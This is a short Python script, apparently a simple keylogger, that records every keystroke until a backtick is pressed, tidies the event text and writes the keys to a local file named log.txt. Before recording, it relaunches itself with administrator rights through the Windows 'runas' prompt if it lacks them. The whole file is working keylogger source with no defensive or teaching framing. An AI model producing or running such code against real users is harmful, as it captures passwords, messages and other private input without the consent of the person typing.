from keyboard import record
import ctypes #Funny C in Py
from sys import executable, argv

output = open("log.txt", 'w')
c = (ctypes.windll.shell32)

def start():
    r = record(until='`')
    r = str(r)
    r = r.replace(',', '')
    r = r.replace("KeyboardEvent(", '')
    r = r.replace("down)", ',')
    r = r.replace("up)", '\'')
    output.write(r)

if __name__ == "__main__":
    if not c.IsUserAnAdmin():
        c.ShellExecuteW(None, 'runas', executable, ' '.join(argv), None, None)
    start()